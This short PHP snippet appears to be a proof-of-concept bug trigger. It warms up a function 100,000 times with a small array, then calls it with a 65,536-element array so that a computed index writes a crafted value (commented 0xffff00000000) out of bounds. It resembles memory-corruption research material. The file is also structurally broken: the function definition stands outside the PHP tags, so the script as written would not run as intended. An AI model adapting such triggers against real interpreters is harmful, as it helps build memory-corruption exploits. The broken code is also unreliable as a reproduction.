<?php

?>

function opt($arg) {
    $x = func_num_args();
    $a1 = array_fill(0, 0x10, null);
    $a2 = array(1.1, 1.1);
    $a1[($x >> 16) * 0xf00000] = 1.39064994160909e-309; // 0xffff00000000
}

$a1 = array();
$a2 = array();

$small = array(1.1);
$large = array(1.1, 1.1);
$large = array_pad($large, 65536, 1.1);

<?php

for ($j = 0; $j < 100000; $j++) {
    opt(...$small);
}

// Trigger bug
opt(...$large);

?>
